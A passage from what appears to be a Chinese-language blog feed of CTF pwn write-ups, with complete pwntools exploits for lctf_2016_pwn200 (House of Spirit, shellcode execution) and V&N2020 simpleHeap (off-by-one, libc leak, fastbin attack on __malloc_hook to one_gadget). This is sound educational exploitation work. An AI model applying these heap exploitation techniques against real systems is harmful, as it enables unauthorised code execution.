class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;rbp: 0x%x&#x27;</span> % leak_addr)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;give me your id ~~?\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode_addr = leak_addr - <span class="number">0x50</span></span><br><span class="line">fake_chunk_addr = leak_addr - <span class="number">0x90</span></span><br><span class="line">ru(<span class="string">&#x27;give me money~\n&#x27;</span>)</span><br><span class="line"><span class="comment"># payload = p64(0)*4 + p64(0) + p64(0x41) + p64(0) + p64(fake_chunk_addr)</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">s(payload)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>leak得到rbp地址后，看下shellcode和要部署的fake chunk的data段地址的偏移：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/HOS_learning/offsetR.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode_addr = leak_addr - <span class="number">0x50</span></span><br><span class="line">fake_chunk_addr = leak_addr - <span class="number">0x90</span></span><br></pre></td></tr></table></figure><p>后面就不难了，按照利用思路一步一步走就可以了（其实是懒得写了XD</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./lctf_2016_pwn200&#x27;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">elf = ELF(binary,checksec=<span class="literal">False</span>)</span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh(), arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">if</span> args[<span class="number">1</span>] == <span class="string">&#x27;r&#x27;</span> <span class="keyword">else</span> process(binary) </span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    <span class="comment"># raw_input(&#x27;en..&#x27;)</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;pid &quot;</span> + <span class="built_in">str</span>(proc.pidof(p))</span><br><span class="line">    raw_input(<span class="string">&quot;attach me&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;who are u?\n&#x27;</span>)</span><br><span class="line">    payload = shellcode</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>)</span><br><span class="line">    s(payload)</span><br><span class="line">    ru(payload)</span><br><span class="line"></span><br><span class="line">    leak_addr = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&#x27;rbp: 0x%x&#x27;</span> % leak_addr)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;give me your id ~~?\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    shellcode_addr = leak_addr - <span class="number">0x50</span></span><br><span class="line">    fake_chunk_addr = leak_addr - <span class="number">0x90</span></span><br><span class="line">    ru(<span class="string">&#x27;give me money~\n&#x27;</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + p64(<span class="number">0</span>) + p64(fake_chunk_addr)</span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;\n=======EASY HOTEL========\n1. check in\n2. check out\n3. goodbye\nyour choice : &#x27;</span>)</span><br><span class="line">    sl(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;\n=======EASY HOTEL========\n1. check in\n2. check out\n3. goodbye\nyour choice : &#x27;</span>)</span><br><span class="line">    sl(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;how long?\n&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line">    p.recvline(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(shellcode_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    s(payload)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;\n=======EASY HOTEL========\n1. check in\n2. check out\n3. goodbye\nyour choice : &#x27;</span>)</span><br><span class="line">    sl(<span class="number">3</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h1&gt;&lt;p&gt;House of Spirit是组合型的漏洞利用，它是指针覆盖和堆管理机制的组合利用。该技术的核心在于在目标位置处伪造fas</summary>
      
    
    
    
    <category term="二进制漏洞" scheme="http://example.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="how2heap" scheme="http://example.com/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N2020 公开赛 simpleHeap</title>
    <link href="http://example.com/2021/03/14/[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]simpleHeap/"/>
    <id>http://example.com/2021/03/14/[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]simpleHeap/</id>
    <published>2021-03-14T01:27:00.000Z</published>
    <updated>2021-03-21T07:08:18.047Z</updated>
    
    <content type="html"><![CDATA[<p>这一题涉及到的知识点比较多，包括off-by-one，unsorted_bin attach和fast_bin attach，还有通过使用realloc调整栈帧来使one_gadget满足条件。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h3><p>保护全开，按目前学习的体会，大概就是要伪造fake chunk来修改malloc_hook。<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/checksce.png"></p><h3 id="IDA反汇编分析"><a href="#IDA反汇编分析" class="headerlink" title="IDA反汇编分析"></a>IDA反汇编分析</h3><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/menu.png"><br>完整的菜单，有添加、编辑、打印和删除四个功能</p><p>add函数：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/add.png"><br>先读入size，然后对size有大小的检查，通过检查会将分配chunk的malloc指针赋给chunk_list数组。然后将size的值存入size_list数组中，并读入内容。</p><p>edit函数<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/edit.png"><br>重点在my_read函数，在这里存在off-by-one漏洞：<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/my_read.png"><br>在i和a2大小的比较那里应该是i&gt;=a2，否则编辑时会多写入一个字符，造成off-by-one</p><p>show函数<br>简单的打印<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/show.png"></p><p>delete函数<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/delete.png"><br>将chunk释放后，将malloc指针置空，同时size大小置为0</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>利用off-by-one漏洞修改堆块大小，实现overlapping，然后释放到unsorted bin中<br>由于此时unsorted bin中只有一个chunk，它的fd和bk指针都指向unsorted_bin_addr，即main_arena+88<br>再申请unsorted bin中chunk一半的大小，根据glibc的内存分配机制，此时会直接对unsorted bin进行切割。<br>这时就可以泄露出main_arena的地址，而main_arena和libc基址的偏移是固定的，我们可以得到libc基址，进而得到其他函数的地址<br>最后在malloc-0x23位置构造fake chunk，将malloc修改为one_gadget，就可getshell了</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="申请四个堆块"><a href="#申请四个堆块" class="headerlink" title="申请四个堆块"></a>申请四个堆块</h3><p>第1个堆块用于off-by-one<br>第2个和第3个用于合并成超过0x80的chunk，释放后进入unsorted bin<br>第4个用于释放时防止与top chunk合并</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;dddd&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><h3 id="利用off-by-one"><a href="#利用off-by-one" class="headerlink" title="利用off-by-one"></a>利用off-by-one</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p8(<span class="number">0xe1</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/off-by-one.png"><br>此时可以看到chunk大小已经被修改<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/off-by-one2.png"></p><h3 id="泄露main-arena，得到libc-base"><a href="#泄露main-arena，得到libc-base" class="headerlink" title="泄露main_arena，得到libc base"></a>泄露main_arena，得到libc base</h3><p>此时再申请一个堆块，再打印chunk2就可以泄露main_arena_88<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/off-by-one3.png"></p><p>main_arena和main_arena_88的偏移为88，而main_arena和libc base的偏移可以由<a href="https://github.com/bash-c/main_arena_offset">main_arena</a>这个工具计算得到。有了libc基址我们就可以得到各种函数的地址了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># main_arena_88 = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">main_arena_88 = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[:-<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;main arena+88:0x%x&#x27;</span> % main_arena_88)</span><br><span class="line">main_arena = main_arena_88 - <span class="number">88</span></span><br><span class="line">log.success(<span class="string">&#x27;main arena:0x%x&#x27;</span> % main_arena)</span><br><span class="line">main_arena_offset_with_libc_base = <span class="number">0x3c4b20</span></span><br><span class="line">libc_base = main_arena - main_arena_offset_with_libc_base</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x4526a</span> + libc_base</span><br><span class="line">realloc=libc_base+libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"><span class="comment"># realloc = libc_base + 0x846c0</span></span><br><span class="line">log.success(<span class="string">&#x27;libc base:0x%x&#x27;</span> % libc_base)</span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook:0x%x&#x27;</span> % malloc_hook)</span><br><span class="line">log.success(<span class="string">&#x27;one_gadget:0x%x&#x27;</span> % one_gadget)</span><br><span class="line">log.success(<span class="string">&#x27;realloc:0x%x&#x27;</span> % realloc)</span><br></pre></td></tr></table></figure><h3 id="劫持malloc"><a href="#劫持malloc" class="headerlink" title="劫持malloc"></a>劫持malloc</h3><p>此时我们申请一个0x60的堆块chunk4来控制chunk2<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/malloc.png"><br>再先后释放chunk3和chunk2:<br><img src="https://gitee.com/see1c3y/buuctf/raw/master/pwn/%5BV&N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B%5DsimpleHeap/malloc2.png"><br>这时我们就可以通过chunk4来修改chunk2的fd指针（下列几步由于本地环境有点问题没法动态调试）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span> <span class="comment"># size=0x7f allocate a 0x68 chunk to make use of the fake chunk</span></span><br><span class="line">payload = p64(fake_chunk) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">4</span>,payload) </span><br></pre></td></tr></table></figure><p>然后申请chunk5来重启chunk2:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaaa\n&#x27;</span>) <span class="comment"># 5</span></span><br></pre></td></tr></table></figure><p>申请并劫持malloc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc+<span class="number">12</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">add(<span class="number">0x60</span>, payload)</span><br></pre></td></tr></table></figure><p>之后再申请任意大小的chunk就可以getshell了</p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vn_pwn_simpleHeap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    raw_input(<span class="string">&#x27;en..&#x27;</span>)</span><br><span class="line">    <span class="comment"># print &quot;pid &quot; + str(proc.pidof(p))</span></span><br><span class="line">    <span class="comment"># raw_input(&quot;attach me&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">p</span>):</span></span><br><span class="line">    add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;dddd&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p8(<span class="number">0xe1</span>)</span><br><span class="line">    edit(<span class="number">0</span>,payload)</span><br><span class="line">    delete(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># main_arena_88 = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">    main_arena_88 = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[:-<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&#x27;main arena+88:0x%x&#x27;</span> % main_arena_88)</span><br><span class="line">    main_arena = main_arena_88 - <span class="number">88</span></span><br><span class="line">    log.success(<span class="string">&#x27;main arena:0x%x&#x27;</span> % main_arena)</span><br><span class="line">    main_arena_offset_with_libc_base = <span class="number">0x3c4b20</span></span><br><span class="line">    libc_base = main_arena - main_arena_offset_with_libc_base</span><br><span class="line">    malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    one_gadget = <span class="number">0x4526a</span> + libc_base</span><br><span class="line">    realloc=libc_base+libc.symbols[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">    <span class="comment"># realloc = libc_base + 0x846c0</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base:0x%x&#x27;</span> % libc_base)</span><br><span class="line">    log.success(<span class="string">&#x27;malloc_hook:0x%x&#x27;</span> % malloc_hook)</span><br><span class="line">    log.success(<span class="string">&#x27;one_gadget:0x%x&#x27;</span> % one_gadget)</span><br><span class="line">    log.success(<span class="string">&#x27;realloc:0x%x&#x27;</span> % realloc)</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 4(2)</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    fake_chunk = malloc_hook - <span class="number">0x23</span> <span class="comment"># size=0x7f allocate a 0x68 chunk to make use of the fake chunk</span></span><br><span class="line">    payload = p64(fake_chunk)</span><br><span class="line">    edit(<span class="number">4</span>,payload) </span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;aaaa\n&#x27;</span>) <span class="comment"># 5</span></span><br><span class="line">    debug()</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc+<span class="number">12</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    add(<span class="number">0x60</span>, payload)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size?&#x27;</span>,<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="comment"># payload = &#x27;a&#x27;*3 + &#x27;a&#x27;*0x20 + p64(one_gadget)</span></span><br><span class="line">    <span class="comment"># add(0x60,&#x27;payload&#x27;) # 6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    log.info(<span class="string">&quot;For remote: %s HOST PORT&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        p = remote(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]))</span><br><span class="line">        exploit(p)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># p = process([&#x27;./babyheap&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">        p = process(<span class="string">&#x27;./vn_pwn_simpleHeap&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> util.proc.pidof(p)</span><br><span class="line">        exploit(p)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这一题涉及到的知识点比较多，包括off-by-one，unsorted_bin attach和fast_bin attach，还有通过使用realloc调整栈帧来使one_gadget满足条件。&lt;/p&gt;
&lt;h2 id=&quot;静态分析&quot;&gt;&lt;a href=&quot;#静态分析&quot; class</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="BUUCTF" scheme="http://example.com/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>ciscn_2019_es_2</title>
    <link href="http://example.com/2021/02/07/ciscn_2019_es_2/"/>
    <id>http://example.com/2021/02/07/ciscn_2019_es_2/</id>
    <published>2021-02-07T06:59:00.000Z</published>
    <updated>2021-03-21T07:08:29.000Z</updated>
    
